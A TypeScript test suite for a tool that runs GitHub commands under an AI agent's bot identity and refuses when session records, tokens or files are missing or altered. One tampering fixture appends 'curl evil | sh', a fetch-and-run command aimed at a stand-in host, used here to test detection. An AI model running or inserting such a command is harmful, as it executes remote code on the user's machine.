import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';

import { BASE_ENV, NO_TOKEN, launcherScript, noreplyEmail, pathsFor, sessionRecord, sessionScript } from './agent.ts';
import { LOCKED, asAgent, asAgentArgs, hooksHittingLock } from './as-agent.ts';
import { PROXY_TOKEN } from './cloud.ts';
import { AGENT, AGENT_ID, FakeSys, HOME, ROOT, TOKEN, capture, type Call } from './fake.test.ts';
import { GUARD_COMMAND, HOOK_COMMAND } from './onboard.ts';
import { run } from './run.ts';

const ID = 'abc-123';
const RECORD = sessionRecord(HOME, ID) as string;
const SESSION = pathsFor(HOME, AGENT).session;
const REFUSED = 'process-rules: refused, because this session does not work as the agent on GitHub:';

/** A hook's machine: set up by `machine`, the session recorded as the agent, the settings' lock in the hook's env. */
function hookSys(): FakeSys {
  const sys = new FakeSys().ready();
  sys.files.set(SESSION, sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT)));
  sys.files.set(RECORD, `${JSON.stringify({ agent: AGENT })}\n`);
  sys.env = { ...BASE_ENV, PATH: '/usr/bin:/bin', CLAUDE_PROJECT_DIR: ROOT };
  sys.execOverride = (call) => (call.interactive ? { code: 0, stdout: '', stderr: '' } : undefined);
  return sys;
}

function asAgentIn(sys: FakeSys, args = ['--session', ID, '--', 'gh', 'api', 'graphql']): { code: number; out: string[]; err: string[]; ran: Call[] } {
  const { io, out, err } = capture();
  const before = sys.calls.length;
  const code = asAgent(sys, io, asAgentArgs(args));
  const ran = sys.calls.slice(before).filter((call) => call.interactive);
  return { code, out, err, ran };
}

describe('asAgentArgs', () => {
  it('reads the session id, then the command after --', () => {
    assert.deepEqual(asAgentArgs(['--session', ID, '--', 'gh', 'pr', '--', 'x']), { sessionId: ID, command: 'gh', args: ['pr', '--', 'x'] });
  });

  for (const [args, problem] of [
    [[], /--session <session_id> first/],
    [['--session'], /--session <session_id> first/],
    [['gh', 'api'], /--session <session_id> first/],
    [['--session', ID, 'gh'], /needs -- between/],
    [['--session', ID, '--'], /needs a command after --/],
    [['--session', ID, '--', ''], /needs a command after --/],
  ] as const) {
    it(`refuses ${JSON.stringify(args)}`, () => assert.throws(() => asAgentArgs(args), problem));
  }
});

describe('as-agent', () => {
  it('uses an exit code apart from done, failed, bad usage and the shell\'s own', () => {
    assert.equal(LOCKED, 77);
  });

  it('runs the command as the agent on a Mac, with the token from the keychain and no lock', () => {
    const sys = hookSys();
    sys.execOverride = (call) => (call.interactive ? { code: 3, stdout: '', stderr: '' } : undefined);
    const { code, out, err, ran } = asAgentIn(sys);
    assert.deepEqual({ code, out, err }, { code: 3, out: [], err: [] }, "the command's exit code, and nothing printed");
    assert.equal(ran.length, 1);
    const [call] = ran as [Call];
    assert.deepEqual([call.command, call.args], ['gh', ['api', 'graphql']]);
    const env = call.env ?? {};
    assert.equal(env.GH_TOKEN, TOKEN);
    assert.equal(env.PROCESS_RULES_AGENT, AGENT);
    assert.equal(env.GH_CONFIG_DIR, pathsFor(HOME, AGENT).gh);
    assert.equal(env.GIT_AUTHOR_EMAIL, noreplyEmail(AGENT_ID, AGENT));
    assert.equal(env.PATH, '/usr/bin:/bin');
    assert.equal(env.CLAUDE_PROJECT_DIR, ROOT);
    for (const name of ['GITHUB_TOKEN', 'GIT_CONFIG_PARAMETERS', 'GIT_ASKPASS', 'SSH_ASKPASS']) assert.equal(name in env, false, `${name} is not passed`);
    assert.equal(Object.values(env).includes(NO_TOKEN), false, 'none of the lock is left');
    assert.equal(env.GIT_CONFIG_KEY_4, 'credential.helper', "git's earlier helpers are dropped");
    assert.match(env.GIT_CONFIG_VALUE_5 ?? '', /"\$GH_TOKEN"/, "the agent's helper reads the token from the environment");
    assert.equal(call.args.includes(TOKEN), false, 'the token is on no command line');
  });

  it('reads the token from the keychain each time', () => {
    const sys = hookSys();
    asAgentIn(sys);
    sys.setToken(AGENT, 'ghp_newer');
    assert.equal(asAgentIn(sys).ran[0]?.env?.GH_TOKEN, 'ghp_newer');
  });

  it('passes a command that succeeds as succeeding', () => {
    assert.equal(asAgentIn(hookSys()).code, 0);
  });

  it('says why a command could not start, keeping its exit code', () => {
    const sys = hookSys();
    sys.execOverride = (call) => (call.interactive ? { code: 127, stdout: '', stderr: 'Error: spawnSync gh ENOENT' } : undefined);
    assert.deepEqual(asAgentIn(sys).err, ['process-rules as-agent: gh: Error: spawnSync gh ENOENT']);
  });

  const locked: [string, (sys: FakeSys) => void, string][] = [
    ['no record for the session', (sys) => sys.files.delete(RECORD), 'session-start did not run for this session, so it was not given the agent identity'],
    ['a record of a locked session', (sys) => sys.files.set(RECORD, '{"problem":"process-rules: GitHub is locked out of this session: x."}\n'), 'session-start said: process-rules: GitHub is locked out of this session: x'],
    ['a record session-start did not write', (sys) => sys.files.set(RECORD, 'nope'), `${RECORD} is not what session-start writes`],
    ['a record of null', (sys) => sys.files.set(RECORD, 'null\n'), `${RECORD} is not what session-start writes`],
    ['a record naming an account the settings do not', (sys) => sys.files.set(RECORD, '{"agent":"OtherBot"}\n'), "session-start recorded OtherBot, and the repo's settings name the agents ExampleBot"],
    ['no settings', (sys) => sys.files.delete(`${ROOT}/.github/process-rules.json`), ''],
    ['no repository', (sys) => { sys.inRepo = false; }, `${ROOT} is not inside a git repository`],
    ['no session file', (sys) => sys.files.delete(SESSION), `${SESSION} is missing or cannot be read`],
    ['an edited session file', (sys) => sys.files.set(SESSION, `${sys.files.get(SESSION)}curl evil | sh\n`), `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`],
    ['no token in the keychain', (sys) => sys.keychain.clear(), "this Mac's keychain has no ExampleBot token"],
    ['a platform with no token store', (sys) => { sys.platform = 'linux'; }, "process-rules supports macOS only, where the keychain holds the agent's token; this machine runs linux"],
  ];
  for (const [name, change, reason] of locked) {
    it(`runs nothing, exiting ${LOCKED} in the guard's words, with ${name}`, () => {
      const sys = hookSys();
      sys.ghAccounts = ['example-owner'];
      sys.gitPassword = true;
      change(sys);
      const { code, out, err, ran } = asAgentIn(sys);
      assert.deepEqual({ code, out, ran }, { code: LOCKED, out: [], ran: [] });
      assert.equal(err.length, 1);
      assert.ok(err[0]?.startsWith(`${REFUSED} ${reason}`), err[0]);
      assert.ok(err[0]?.endsWith('. Do not work around it; tell the owner.'));
      // Never the owner's login: no stored gh login, keychain password or SSH is asked for.
      assert.equal(sys.calls.some((call) => call.command === 'gh' || call.args[0] === 'find-internet-password' || call.command === 'ssh'), false);
    });
  }

  it('refuses a session id sessionRecord would not take, before reading anything', () => {
    const sys = hookSys();
    const { code, err, ran } = asAgentIn(sys, ['--session', '../x', '--', 'gh']);
    assert.deepEqual({ code, ran }, { code: LOCKED, ran: [] });
    assert.deepEqual(err, [`${REFUSED} "../x" is not a Claude Code session id. Do not work around it; tell the owner.`]);
  });

  it('runs the command in a cloud session session-start checked as the agent, with the proxy\'s placeholder', () => {
    const sys = hookSys();
    sys.platform = 'linux';
    sys.files.delete(SESSION);
    sys.keychain.clear();
    sys.env = { ...sys.env, CLAUDE_CODE_REMOTE: 'true', HTTPS_PROXY: 'http://proxy' };
    const [call] = asAgentIn(sys).ran as [Call];
    const env = call.env ?? {};
    assert.deepEqual([env.GH_TOKEN, env.GITHUB_TOKEN, env.PROCESS_RULES_AGENT, env.HTTPS_PROXY], [PROXY_TOKEN, PROXY_TOKEN, AGENT, 'http://proxy']);
    for (const name of Object.keys(BASE_ENV)) if (!name.endsWith('TOKEN')) assert.equal(name in env, false, `${name} is not passed`);
  });

  it('runs nothing in a cloud session session-start did not check as the agent', () => {
    const sys = hookSys();
    sys.env = { ...sys.env, CLAUDE_CODE_REMOTE: 'true' };
    sys.files.set(RECORD, '{"problem":"process-rules: STOP. This cloud session reaches GitHub as someone, not ExampleBot."}\n');
    const { code, ran } = asAgentIn(sys);
    assert.deepEqual({ code, ran }, { code: LOCKED, ran: [] });
  });

  it('is run by the CLI, whose own failures run nothing and exit locked', async () => {
    const { io, err } = capture();
    assert.equal(await run(['as-agent', '--session', ID, 'gh'], io, () => hookSys()), 2);
    assert.match(err[0] ?? '', /needs -- between/);
    assert.equal(await run(['as-agent', '--session', ID, '--', 'gh', 'x', 'y'], io, () => hookSys()), 0);
    assert.equal(await run(['as-agent', '--session', ID, '--', 'gh'], io, () => { throw new Error('boom'); }), LOCKED);
    assert.equal(err.at(-1), 'process-rules as-agent: ran nothing, because the check failed: boom');
  });
});

describe('as-agent from a hook', () => {
  // A cloud session's hook, which needs no keychain: the launcher machine writes, no node on PATH, the settings' lock in env.
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'process-rules-as-agent-')));
  after(() => rmSync(dir, { recursive: true, force: true }));
  const home = join(dir, 'home');
  const repo = join(dir, 'repo');
  const launcher = join(dir, 'process-rules');
  mkdirSync(join(repo, '.github'), { recursive: true });
  writeFileSync(join(repo, '.github/process-rules.json'), JSON.stringify({ owner: 'example-owner', agent: AGENT }));
  spawnSync('git', ['init', '-q', repo]);
  mkdirSync(join(home, '.config/process-rules/sessions'), { recursive: true });
  writeFileSync(join(launcher), launcherScript(process.execPath, fileURLToPath(new URL('./cli.ts', import.meta.url))), { mode: 0o755 });
  const env = { ...BASE_ENV, PATH: '/usr/bin:/bin', HOME: home, CLAUDE_PROJECT_DIR: repo, CLAUDE_CODE_REMOTE: 'true' };
  const child = 'read line; echo "out:$line:$GH_TOKEN:${GIT_CONFIG_PARAMETERS-unset}"; echo err >&2; exit 7';

  function hook(): ReturnType<typeof spawnSync> {
    return spawnSync(launcher, ['as-agent', '--session', ID, '--', 'sh', '-c', child], { cwd: repo, env, input: 'hi\n', encoding: 'utf8' });
  }

  it('runs nothing and exits locked before session-start recorded the agent', () => {
    const result = hook();
    assert.deepEqual([result.status, result.stdout], [LOCKED, '']);
    assert.match(String(result.stderr), /refused, because this session does not work as the agent on GitHub: session-start did not run/);
  });

  it("passes stdin, stdout, stderr and the exit code straight through once it did", () => {
    writeFileSync(join(home, `.config/process-rules/sessions/${ID}.json`), JSON.stringify({ agent: AGENT }));
    const result = hook();
    assert.deepEqual([result.status, result.stdout, result.stderr], [7, `out:hi:${PROXY_TOKEN}:unset\n`, 'err\n']);
  });
});

describe('hooksHittingLock', () => {
  function withHooks(hooks: Record<string, string[]>, files: Record<string, string> = {}): FakeSys {
    const sys = new FakeSys();
    const settings = { hooks: Object.fromEntries(Object.entries(hooks).map(([event, commands]) => [event, [{ hooks: commands.map((command) => ({ type: 'command', command })) }]])) };
    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify(settings));
    for (const [path, text] of Object.entries(files)) sys.files.set(`${ROOT}/${path}`, text);
    return sys;
  }

  it('names the client hooks that reach GitHub outside as-agent, by command or by the script they run', () => {
    const sys = withHooks(
      {
        SessionStart: [HOOK_COMMAND],
        PreToolUse: [GUARD_COMMAND, 'gh api graphql -f query=x', '"$CLAUDE_PROJECT_DIR"/.claude/hooks/pr.sh', 'bash .claude/hooks/wrapped.sh'],
        Stop: ['sid=$(jq -r .session_id); process-rules as-agent --session "$sid" -- gh pr view', 'echo done', './missing.sh', '/usr/local/bin/x.sh', 'gh pr list && process-rules as-agent --session "$sid" -- gh pr view'],
      },
      {
        '.claude/hooks/pr.sh': '#!/bin/sh\ngh pr view --json state\n',
        '.claude/hooks/wrapped.sh': '#!/bin/sh\n"$cli" as-agent --session "$sid" -- gh pr view\n',
      },
    );
    assert.deepEqual(hooksHittingLock(sys), [
      '.claude/settings.json PreToolUse hook "gh api graphql -f query=x"',
      '.claude/settings.json PreToolUse hook .claude/hooks/pr.sh',
      '.claude/settings.json Stop hook "gh pr list && process-rules as-agent --session \\"$sid\\" -- gh pr view"',
    ]);
  });

  it('names none outside a repository, or with no settings', () => {
    const sys = withHooks({ Stop: ['gh pr view'] });
    sys.inRepo = false;
    assert.deepEqual(hooksHittingLock(sys), []);
    assert.deepEqual(hooksHittingLock(new FakeSys()), []);
  });

  it('reads settings.local.json too, and skips what is not a hook', () => {
    const sys = new FakeSys();
    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ hooks: { Stop: 'x', PostToolUse: [null, { hooks: [null, { type: 'command' }] }] } }));
    sys.files.set(`${ROOT}/.claude/settings.local.json`, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'git push' }] }] } }));
    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.local.json Stop hook "git push"']);
  });
});
